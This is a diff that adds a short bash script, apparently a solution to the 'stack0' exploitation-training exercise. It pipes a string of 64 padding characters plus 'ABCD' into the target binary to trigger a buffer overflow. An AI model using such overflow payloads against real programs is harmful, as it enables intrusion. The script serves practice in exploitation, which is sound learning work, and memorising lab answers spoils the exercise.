@@ -1,0 +1,3 @@
+#!/bin/bash
+# Simplest buffer overflow
+echo -n 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABCD' | ./stack0
